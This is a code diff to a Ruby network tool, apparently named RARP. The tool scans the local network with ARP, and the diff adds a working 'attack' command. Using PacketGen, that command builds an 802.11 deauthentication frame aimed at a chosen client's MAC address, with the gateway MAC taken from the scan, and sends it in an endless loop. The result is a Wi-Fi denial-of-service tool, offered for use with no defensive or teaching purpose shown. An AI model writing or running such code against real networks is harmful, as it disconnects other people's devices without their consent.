@@ -1,17 +1,26 @@
 require "arp_scan"
 require "tty-progressbar"
+require "packetgen"
 
 require_relative "utils"
 require_relative "logger"
 
 class RARP
+	def self.get_mac(ip)
+		mac = ARPScan(ip).hosts.first.mac
+	end
+
 	attr_reader :ips
+	attr_reader :arp_hosts
+	attr_reader :macs
 
 	def initialize
 		@scanned = false
 		@report = nil
-		@hosts = Array.new
+		@gateway = nil
+		@arp_hosts = Array.new
 		@ips = Array.new
+		@macs = Array.new
 	end
 
 	def scan
@@ -23,12 +32,14 @@ class RARP
 		}
 
 		@scanned = true
-		@hosts = @report.hosts
-		@ips = @hosts.map { |h| h.ip_addr }
+		@arp_hosts = @report.hosts
+		@gateway = @arp_hosts.first.mac
+		@ips = @arp_hosts.map { |h| h.ip_addr }
 		@ips.uniq!
 		@ips.sort_by! {|ip| ip.split('.').map{|octet| octet.to_i}}
+		@macs = @arp_hosts.map { |h| h.mac }
 		info("Successfully scanned!")
-		return @hosts.uniq!
+		return @arp_hosts.uniq!
 	end
 
 	def ipinfo(ip)
@@ -45,11 +56,7 @@ class RARP
 	def help
 		info("Current commands:")
 		Utils::CMDS.each do |cmd|
-			if cmd.eql? "info" or cmd.eql? "attack"
-				puts "\t- #{cmd} [ip]"
-			else
-				puts "\t- #{cmd}"
-			end
+			puts "\t- #{cmd}"
 		end
 	end
 
@@ -64,8 +71,32 @@ class RARP
 		end
 	end
 
-	def attack
-		warning("Coming soon...")
+	def attack(host)
+		begin
+			stop = Proc.new { print "\e[1A\e[K"; info("Stopping..."); return }
+			pkt = PacketGen.gen("RadioTap").
+			add("Dot11::Management", mac1: host, mac2: @gateway, mac3: @gateway).
+			add("Dot11::DeAuth", reason: 7)
+
+			info("Gateway: #{@gateway}")
+			info("Client: #{host}")
+
+			bar = TTY::ProgressBar.new("Attacking... [:bar]", clear: true, bar_format: :box)
+			begin
+				loop do |sent|
+					bar.advance
+					pkt.to_w
+				end
+			ensure
+
+				bar.finish
+				stop.call
+			end
+
+		rescue
+			warning("An error occurred")
+			return
+		end
 	end
 
 	def config
@@ -74,7 +105,6 @@ class RARP
 			return
 		end
 
-		info("Interface: #{@report.interface}")
 		info("Range: #{@report.range_size}")
 		info("Alive: #{@report.reply_count}")
 		info("Last scan time: #{@report.scan_time	}")
